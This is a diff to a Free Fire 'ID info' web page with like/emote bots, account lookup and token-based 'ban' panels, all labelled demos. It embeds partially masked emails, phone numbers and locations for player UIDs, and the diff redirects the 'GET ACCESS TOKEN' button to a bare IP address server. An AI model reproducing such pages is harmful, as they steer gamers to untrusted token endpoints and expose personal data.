@@ -25,11 +25,8 @@ label{display:block;color:#cbb9dd;font-size:13px;margin:0 0 7px}input,select{wid
 </style>
 </head>
 <body>
-
 <header><div class="logo"><div class="logo-icon">AI</div><div><h1>FREEFIRE MAX ID INFO</h1><p>ANUJ AI STUDIO</p></div></div></header>
-
 <main class="wrap">
-
 <section id="home" class="page active">
 <div class="hero"><h2>FREEFIRE MAX ID INFO</h2><p>Fast • Simple • Mobile Friendly</p><div class="badge">ANUJ AI STUDIO • DEMO PANEL</div></div>
 <div class="grid">
@@ -39,134 +36,43 @@ label{display:block;color:#cbb9dd;font-size:13px;margin:0 0 7px}input,select{wid
 <div class="card"><h3>⚡ TCP BOT</h3><p class="desc">A new feature is being prepared for a future update.</p><button class="open" onclick="openPage('tcp')">OPEN TCP BOT</button></div>
 <div class="card"><h3>🔐 ACCESS TOKEN</h3><p class="desc">Open the access-token demonstration panel.</p><button class="open" onclick="openPage('access')">OPEN ACCESS TOKEN</button></div>
 <div class="card"><h3>📲 TELEGRAM</h3><p class="desc">Open the official ANUJ AI STUDIO Telegram channel.</p><button class="open" onclick="openTelegram()">OPEN TELEGRAM</button></div>
-</div>
-<footer>© 2026 ANUJ AI STUDIO • FREEFIRE MAX ID INFO</footer>
+</div><footer>© 2026 ANUJ AI STUDIO • FREEFIRE MAX ID INFO</footer>
 </section>
-
 <section id="like" class="page"><div class="panel"><div class="panel-head"><h2>❤️ LIKE BOT</h2><button class="back" onclick="goHome()">Back</button></div><div class="panel-body"><p class="note">Enter your UID → Send Like → demo response.</p><label>Enter UID</label><input id="likeUid" inputmode="numeric" placeholder="Enter your Free Fire UID"><button class="action" onclick="sendLike()">SEND LIKE</button><div id="likeStatus" class="status"></div></div></div></section>
-
 <section id="emot" class="page"><div class="panel"><div class="panel-head"><h2>🎭 EMOT BOT</h2><button class="back" onclick="goHome()">Back</button></div><div class="panel-body"><p class="note">Enter the details below.</p><label>Enter Team Code</label><input id="teamCode" placeholder="Enter team code"><label>Select Reason / Server</label><select id="reason"><option value="">Select reason</option><option>India</option><option>Pakistan</option><option>BD</option><option>Taiwan</option><option>Canada</option></select><label>Enter UID</label><input id="emotUid" inputmode="numeric" placeholder="Enter your Free Fire UID"><label>Select Emot</label><select id="emot"><option value="">Select emot</option><option>Dance</option><option>Clap</option><option>Laugh</option><option>Wave</option><option>Special Emot</option></select><button class="action" onclick="playEmot()">PLAY EMOT</button><div id="emotStatus" class="status"></div></div></div></section>
-
 <section id="account" class="page"><div class="panel"><div class="panel-head"><h2>🔎 ACCOUNT INFORMATION</h2><button class="back" onclick="goHome()">Back</button></div><div class="panel-body"><label>Enter UID</label><input id="accountUid" inputmode="numeric" placeholder="Enter Free Fire UID"><button class="action" onclick="searchAccount()">SEARCH</button><div id="accountResults" class="results"></div><p class="small-warning">Demo data only — no access to Free Fire, Garena, email, phone, or private account systems.</p></div></div></section>
-
 <section id="tcp" class="page"><div class="panel"><div class="panel-head"><h2>⚡ TCP BOT</h2><button class="back" onclick="goHome()">Back</button></div><div class="coming"><div class="big">🚧</div><h2>Coming Soon</h2><p>This feature will be available in a future update.</p></div></div></section>
-
-<section id="access" class="page">
-<div class="panel"><div class="panel-head"><h2>🔐 ACCESS TOKEN</h2><button class="back" onclick="goHome()">Back</button></div><div class="panel-body">
-<p class="note">Select an option. This is a safe demonstration and does not transmit real authentication credentials.</p>
-<div class="sub-options">
+<section id="access" class="page"><div class="panel"><div class="panel-head"><h2>🔐 ACCESS TOKEN</h2><button class="back" onclick="goHome()">Back</button></div><div class="panel-body"><p class="note">Select an option. This is a safe demonstration and does not transmit real authentication credentials.</p><div class="sub-options">
 <div class="option-card"><h3>🌐 GET ACCESS TOKEN</h3><p>Open the configured token-provider website in a new tab.</p><button class="option-btn" onclick="getAccessToken()">GET ACCESS TOKEN</button></div>
 <div class="option-card"><h3>🚫 BAN LOGIN</h3><p>Open the simulated ban-login flow.</p><button class="option-btn" onclick="openPage('banLogin')">BAN LOGIN</button></div>
 <div class="option-card"><h3>⛔ PERMANENT BAN</h3><p>Open the simulated permanent-ban flow.</p><button class="option-btn" onclick="openPage('permanentBan')">PERMANENT BAN</button></div>
 <div class="option-card"><h3>👤 ID LOGIN</h3><p>Continue to the configured Telegram contact.</p><button class="option-btn" onclick="openTelegram()">ID LOGIN</button></div>
-</div>
-</div></div>
-</section>
-
-<section id="banLogin" class="page"><div class="panel"><div class="panel-head"><h2>🚫 BAN LOGIN</h2><button class="back" onclick="openPage('access')">Back</button></div><div class="panel-body">
-<p class="note">Demo flow only. Enter a placeholder value; it is not uploaded or emailed.</p>
-<label>Paste Demo Token</label><input id="banToken" autocomplete="off" placeholder="Paste demo token">
-<button class="action" onclick="submitBanDemo()">CONTINUE</button><div id="banStatus" class="status"></div>
-<div id="banTimer" class="timer-box"><div class="timer-label">Demo processing time remaining</div><div id="banTimerValue" class="timer">02:00</div></div>
-<div id="banWorking" class="demo-token"><b>✓ DEMO PROCESS COMPLETE</b><p style="margin:8px 0 0;font-size:12px">No working game token was created or inserted.</p></div>
-</div></div></section>
-
-<section id="permanentBan" class="page"><div class="panel"><div class="panel-head"><h2>⛔ PERMANENT BAN</h2><button class="back" onclick="openPage('access')">Back</button></div><div class="panel-body">
-<p class="note">Visual demonstration only. No real account action is performed.</p>
-<label>Paste Demo Token</label><input id="permanentToken" autocomplete="off" placeholder="Paste demo token">
-<button class="action" onclick="submitPermanentDemo()">SUBMIT REQUEST</button><div id="permanentStatus" class="status"></div>
-<div id="permanentTimer" class="timer-box"><div class="timer-label">Demo processing time remaining</div><div id="permanentTimerValue" class="timer">02:00</div></div>
-<div id="permanentWorking" class="demo-token"><b>✓ DEMO REQUEST COMPLETE</b><p style="margin:8px 0 0;font-size:12px">No Free Fire account was banned and no real token was processed.</p></div>
-</div></div></section>
-
+</div></div></div></section>
+<section id="banLogin" class="page"><div class="panel"><div class="panel-head"><h2>🚫 BAN LOGIN</h2><button class="back" onclick="openPage('access')">Back</button></div><div class="panel-body"><p class="note">Demo flow only. Enter a placeholder value; it is not uploaded or emailed.</p><label>Paste Demo Token</label><input id="banToken" autocomplete="off" placeholder="Paste demo token"><button class="action" onclick="submitBanDemo()">CONTINUE</button><div id="banStatus" class="status"></div><div id="banTimer" class="timer-box"><div class="timer-label">Demo processing time remaining</div><div id="banTimerValue" class="timer">02:00</div></div><div id="banWorking" class="demo-token"><b>✓ DEMO PROCESS COMPLETE</b><p style="margin:8px 0 0;font-size:12px">No working game token was created or inserted.</p></div></div></div></section>
+<section id="permanentBan" class="page"><div class="panel"><div class="panel-head"><h2>⛔ PERMANENT BAN</h2><button class="back" onclick="openPage('access')">Back</button></div><div class="panel-body"><p class="note">Visual demonstration only. No real account action is performed.</p><label>Paste Demo Token</label><input id="permanentToken" autocomplete="off" placeholder="Paste demo token"><button class="action" onclick="submitPermanentDemo()">SUBMIT REQUEST</button><div id="permanentStatus" class="status"></div><div id="permanentTimer" class="timer-box"><div class="timer-label">Demo processing time remaining</div><div id="permanentTimerValue" class="timer">02:00</div></div><div id="permanentWorking" class="demo-token"><b>✓ DEMO REQUEST COMPLETE</b><p style="margin:8px 0 0;font-size:12px">No Free Fire account was banned and no real token was processed.</p></div></div></div></section>
 </main>
-
 <script>
+const TOKEN_URL='http://18.212.50.200:5055/';
 const TELEGRAM_URL='https://t.me/ANUJVMOD';
-
 const accountData={
 "3733292511":{"Level":"63","Like":"4012","BR Score":"6095","BR Heroic Count":"9","Last Login":"RAJASTHAN, KARAULI","Last Login Info":"manish*********@gmail.com","Ph. Number":"7891******, 8949******","Last Match Who Play":"Training","Last Login Date":"27/8/26","Prime":"4","Login Access":"manishmeena******@gmail.com"},
 "9581351669":{"Level":"63","Like":"4298","BR Score":"5401","BR Heroic Count":"11","Last Login":"RAJASTHAN, KARAULI","Last Login Info":"manish*********@gmail.com","Ph. Number":"7891******, 8949******","Last Match Who Play":"BR RANK","Last Login Date":"27/8/26","Prime":"4","Login Access":"rupeshanuj****@gmail.com"},
-"7153896300":{"Level":"69","Like":"9856","BR Score":"4795","BR Heroic Count":"20","Last Login":"UTTAR PRADESH, AZAMGARH","Last Login Info":"sumit*********@gmail.com","Ph. Number":"9828******, 9216******","Last Match Who Play":"CS RANK","Last Login Date":"27/8/26","Prime":"3-(4)","Login Access":"sumitgarg****@gmail.com"}
-};
-
+"7153896300":{"Level":"69","Like":"9856","BR Score":"4795","BR Heroic Count":"20","Last Login":"UTTAR PRADESH, AZAMGARH","Last Login Info":"sumit*********@gmail.com","Ph. Number":"9828******, 9216******","Last Match Who Play":"CS RANK","Last Login Date":"27/8/26","Prime":"3-(4)","Login Access":"sumitgarg****@gmail.com"}};
 function hideAll(){document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'))}
 function openPage(id){hideAll();const p=document.getElementById(id);if(p)p.classList.add('active');window.scrollTo({top:0,behavior:'smooth'})}
 function goHome(){openPage('home')}
-
-function sendLike(){
- const uid=document.getElementById('likeUid').value.trim(),s=document.getElementById('likeStatus');
- s.style.display='block';
- if(!uid){s.className='status warning';s.textContent='⚠️ Please enter a UID.';return}
- s.className='status';s.textContent='⏳ Demo request received for UID '+uid+'. No real game request is being sent.';
-}
-
-function playEmot(){
- const team=document.getElementById('teamCode').value.trim(),reason=document.getElementById('reason').value,uid=document.getElementById('emotUid').value.trim(),emot=document.getElementById('emot').value,s=document.getElementById('emotStatus');
- s.style.display='block';
- if(!team||!reason||!uid||!emot){s.className='status warning';s.textContent='⚠️ Please fill all fields.';return}
- s.className='status';s.textContent='⏳ Demo selected: '+emot+' • '+reason+' • UID '+uid+'. No real game action is being performed.';
-}
-
+function sendLike(){const uid=document.getElementById('likeUid').value.trim(),s=document.getElementById('likeStatus');s.style.display='block';if(!uid){s.className='status warning';s.textContent='⚠️ Please enter a UID.';return}s.className='status';s.textContent='⏳ Demo request received for UID '+uid+'. No real game request is being sent.'}
+function playEmot(){const team=document.getElementById('teamCode').value.trim(),reason=document.getElementById('reason').value,uid=document.getElementById('emotUid').value.trim(),emot=document.getElementById('emot').value,s=document.getElementById('emotStatus');s.style.display='block';if(!team||!reason||!uid||!emot){s.className='status warning';s.textContent='⚠️ Please fill all fields.';return}s.className='status';s.textContent='⏳ Demo selected: '+emot+' • '+reason+' • UID '+uid+'. No real game action is being performed.'}
 function escapeHTML(v){return String(v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;')}
-
-function searchAccount(){
- const uid=document.getElementById('accountUid').value.trim(),box=document.getElementById('accountResults');
- box.style.display='block';
- if(!accountData[uid]){box.innerHTML='<div class="status warning" style="display:block">❌ No sample data found for this UID.</div>';return}
- box.innerHTML=Object.entries(accountData[uid]).map(([k,v])=>'<div class="info"><b>'+escapeHTML(k)+'</b><span>'+escapeHTML(v)+'</span></div>').join('');
-}
-
-function getAccessToken(){
- window.open(TELEGRAM_URL,'_blank','noopener,noreferrer');
-}
-
-function openTelegram(){
- window.open(TELEGRAM_URL,'_blank','noopener,noreferrer');
-}
-
+function searchAccount(){const uid=document.getElementById('accountUid').value.trim(),box=document.getElementById('accountResults');box.style.display='block';if(!accountData[uid]){box.innerHTML='<div class="status warning" style="display:block">❌ No sample data found for this UID.</div>';return}box.innerHTML=Object.entries(accountData[uid]).map(([k,v])=>'<div class="info"><b>'+escapeHTML(k)+'</b><span>'+escapeHTML(v)+'</span></div>').join('')}
+/* GET ACCESS TOKEN opens the requested address in the browser */
+function getAccessToken(){window.location.href=TOKEN_URL}
+function openTelegram(){window.location.href=TELEGRAM_URL}
 let banInterval=null,permanentInterval=null;
-
-function formatTime(seconds){
- const m=Math.floor(seconds/60).toString().padStart(2,'0');
- const s=(seconds%60).toString().padStart(2,'0');
- return m+':'+s;
-}
-
-function startCountdown(seconds,display,complete){
- let remaining=seconds;
- display.textContent=formatTime(remaining);
- const interval=setInterval(()=>{
-  remaining--;
-  display.textContent=formatTime(remaining);
-  if(remaining<=0){clearInterval(interval);if(complete)complete()}
- },1000);
- return interval;
-}
-
-function submitBanDemo(){
- const token=document.getElementById('banToken').value.trim(),status=document.getElementById('banStatus'),timer=document.getElementById('banTimer'),working=document.getElementById('banWorking');
- status.style.display='block';
- if(!token){status.className='status warning';status.textContent='⚠️ Please enter a demo token.';return}
- status.className='status';status.textContent='✓ Demo request accepted. Processing simulation started.';
- timer.style.display='block';working.style.display='none';
- if(banInterval)clearInterval(banInterval);
- banInterval=startCountdown(120,document.getElementById('banTimerValue'),()=>{
-  working.style.display='block';status.className='status success';status.textContent='✓ Demo processing finished.';
- });
-}
-
-function submitPermanentDemo(){
- const token=document.getElementById('permanentToken').value.trim(),status=document.getElementById('permanentStatus'),timer=document.getElementById('permanentTimer'),working=document.getElementById('permanentWorking');
- status.style.display='block';
- if(!token){status.className='status warning';status.textContent='⚠️ Please enter a demo token.';return}
- status.className='status';status.textContent='✓ Demo permanent-ban request accepted. Simulation started.';
- timer.style.display='block';working.style.display='none';
- if(permanentInterval)clearInterval(permanentInterval);
- permanentInterval=startCountdown(120,document.getElementById('permanentTimerValue'),()=>{
-  working.style.display='block';status.className='status success';status.textContent='✓ Demo request processing finished.';
- });
-}
+function formatTime(seconds){const m=Math.floor(seconds/60).toString().padStart(2,'0');const s=(seconds%60).toString().padStart(2,'0');return m+':'+s}
+function startCountdown(seconds,display,complete){let remaining=seconds;display.textContent=formatTime(remaining);const interval=setInterval(()=>{remaining--;display.textContent=formatTime(remaining);if(remaining<=0){clearInterval(interval);if(complete)complete()}},1000);return interval}
+function submitBanDemo(){const token=document.getElementById('banToken').value.trim(),status=document.getElementById('banStatus'),timer=document.getElementById('banTimer'),working=document.getElementById('banWorking');status.style.display='block';if(!token){status.className='status warning';status.textContent='⚠️ Please enter a demo token.';return}status.className='status';status.textContent='✓ Demo request accepted. Processing simulation started.';timer.style.display='block';working.style.display='none';if(banInterval)clearInterval(banInterval);banInterval=startCountdown(120,document.getElementById('banTimerValue'),()=>{working.style.display='block';status.className='status success';status.textContent='✓ Demo processing finished.'})}
+function submitPermanentDemo(){const token=document.getElementById('permanentToken').value.trim(),status=document.getElementById('permanentStatus'),timer=document.getElementById('permanentTimer'),working=document.getElementById('permanentWorking');status.style.display='block';if(!token){status.className='status warning';status.textContent='⚠️ Please enter a demo token.';return}status.className='status';status.textContent='✓ Demo permanent-ban request accepted. Simulation started.';timer.style.display='block';working.style.display='none';if(permanentInterval)clearInterval(permanentInterval);permanentInterval=startCountdown(120,document.getElementById('permanentTimerValue'),()=>{working.style.display='block';status.className='status success';status.textContent='✓ Demo request processing finished.'})}
 </script>
 </body>
 </html>
